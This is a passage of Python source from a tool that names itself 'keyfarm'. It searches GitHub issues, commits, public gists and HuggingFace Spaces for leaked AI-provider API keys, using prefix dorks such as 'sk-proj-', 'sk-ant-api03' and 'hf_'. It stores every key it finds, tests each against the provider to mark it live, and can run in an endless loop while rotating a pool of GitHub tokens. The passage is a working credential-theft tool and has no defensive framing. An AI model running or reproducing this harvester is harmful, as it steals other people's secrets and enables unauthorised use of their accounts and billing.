                n += f.result() or 0
            except Exception as e:
                log(f"  dork error: {e!r}")
    log(f"HUNT done: +{n} keys, raw_files={raw_fetched[0]} — validating...")

    issues_phase()
    gists_phase()
    hf_phase()

    working = dead = 0
    with ThreadPoolExecutor(max_workers=N_THREADS) as ex:
        futs = {}
        for hsh, (key, prov, repo) in found_keys.items():
            futs[ex.submit(validate_key, hsh, key, prov, repo)] = \
                (hsh, key, prov, repo)
        for fut in as_completed(futs):
            hsh, key, prov, repo = futs[fut]
            try:
                st, info = fut.result()
            except Exception:
                continue
            if st == "WORKING":
                working += 1
                log(f"  LIVE {prov} {key[:12]}... {info}  <- {repo[:60]}")
            elif st == "DEAD":
                dead += 1
    log(f"VALIDATE done: WORKING={working} DEAD={dead} (of {len(found_keys)})")


def _scan_hit(title, body, repo):
    """Scan an issue/commit text hit; returns count of new keys."""
    n = 0
    for prov, key in scan_text(f"{title}\n{body}"):
        if key in found_keys:
            continue
        hsh = db_upsert(key, prov, repo)
        with lock:
            found_keys[hsh] = (key, prov, repo)
        n += 1
    return n


def issues_phase():
    """v4.4: GitHub Issues + Commits search — leaked keys in posts."""
    ISS_DORKS = [
        "\"sk-proj-\"", "\"sk-ant-api03\"", "\"sk-or-v1\"", "\"gsk_\"",
        "\"pplx-\"", "\"nvapi-\"", "\"csk-\"", "\"AIza\"", "\"hf_\"",
        "\"xai-\"", "\"r8_\"", "\"fw_\"", "OPENAI_API_KEY",
        "ANTHROPIC_API_KEY", "GEMINI_API_KEY", "GROQ_API_KEY",
        "DEEPSEEK_API_KEY", "OPENROUTER_API_KEY",
    ]
    ISS_API = "https://api.github.com/search/issues"
    COM_API = "https://api.github.com/search/commits"
    n_i = n_c = 0

    def _do(endpoint, dork):
        got = 0
        for page in range(1, 4):  # 300 hits per dork max
            items, st = rest_search(dork, page, endpoint=endpoint)
            if not items:
                break
            for it in items:
                title = it.get("title", "") or ""
                body = it.get("body") or (it.get("commit", {}) or {}) \
                    .get("message", "") or ""
                repo = (it.get("repository_url", "?").rsplit("/", 1)[-1]
                        if endpoint == ISS_API else
                        it.get("repository", {}).get("full_name", "?"))
                got += _scan_hit(title, body, f"{repo}")
        time.sleep(0.5)
        return got

    with ThreadPoolExecutor(max_workers=8) as ex:
        for got in ex.map(lambda d: _do(ISS_API, d), ISS_DORKS):
            n_i += got
    log(f"ISSUES done: +{n_i} keys")
    with ThreadPoolExecutor(max_workers=8) as ex:
        for got in ex.map(lambda d: _do(COM_API, d), ISS_DORKS):
            n_c += got
    log(f"COMMITS done: +{n_c} keys")


def gists_phase():
    """v4.5: public gists firehose (from Github-API-scan approach)."""
    n = 0
    for page in range(1, 4):  # 300 freshest public gists
        tok = POOL.next()
        if not tok:
            break
        try:
            r = requests.get(
                "https://api.github.com/gists/public",
                params={"per_page": 100, "page": page},
                headers={"Authorization": f"Bearer {tok}",
                         "User-Agent": "keyfarm"}, timeout=30)
        except Exception:
            break
        if r.status_code == 401:
            POOL.mark_dead(tok)
            continue
        if r.status_code != 200:
            break
        for g in r.json():
            gid = g.get("id", "?")
            for fname, fi in (g.get("files") or {}).items():
                raw = fi.get("raw_url")
                if not raw:
                    continue
                try:
                    t = requests.get(raw, timeout=15)
                    if t.status_code == 200 and len(t.text) < 1_000_000:
                        src = f"gist/{gid}/{fname}"
                        for prov, key in scan_text(t.text):
                            if key in found_keys:
                                continue
                            hsh = db_upsert(key, prov, src)
                            with lock:
                                found_keys[hsh] = (key, prov, src)
                            n += 1
                except Exception:
                    continue
    log(f"GISTS done: +{n} keys")

def hf_phase():
    """v6.2: HuggingFace Spaces firehose — hardcoded keys in app/config files."""
    n = 0
    UA_HF = {"User-Agent": "keyfarm"}
    try:
        r = requests.get("https://huggingface.co/api/spaces",
                         params={"sort": "createdAt", "direction": -1,
                                 "limit": 80}, headers=UA_HF, timeout=30)
        spaces = r.json() if r.status_code == 200 else []
    except Exception:
        spaces = []
    for s in spaces:
        sid = s.get("id")
        if not sid:
            continue
        try:
            tr = requests.get(
                f"https://huggingface.co/api/spaces/{sid}/tree/main",
                headers=UA_HF, timeout=15)
            if tr.status_code != 200:
                continue
            for f in tr.json():
                if f.get("type") != "file":
                    continue
                path = f.get("path", "")
                if not path.endswith((".py", ".env", ".yml", ".yaml",
                                      ".json", ".txt", ".toml")):
                    continue
                if f.get("size", 0) and f["size"] > 200_000:
                    continue
                raw = f"https://huggingface.co/spaces/{sid}/raw/main/{path}"
                try:
                    t = requests.get(raw, headers=UA_HF, timeout=15)
                    if t.status_code == 200:
                        src = f"hf/{sid}/{path}"
                        for prov, key in scan_text(t.text):
                            if key in found_keys:
                                continue
                            hsh = db_upsert(key, prov, src)
                            with lock:
                                found_keys[hsh] = (key, prov, src)
                            n += 1
                except Exception:
                    continue
        except Exception:
            continue
    log(f"HFSPACES done: +{n} keys (scanned {len(spaces)} spaces)")


def loop():
    while True:
        try:
            found_keys.clear()
            seen_files.clear()
            raw_fetched[0] = 0
            main()
        except Exception as e:
            log(f"loop error: {e!r}")
        log(f"sleep {LOOP_SLEEP}s before next cycle")
        time.sleep(LOOP_SLEEP)


if __name__ == "__main__":
    import sys
    if "--loop" in sys.argv:
        loop()
    else:
        main()
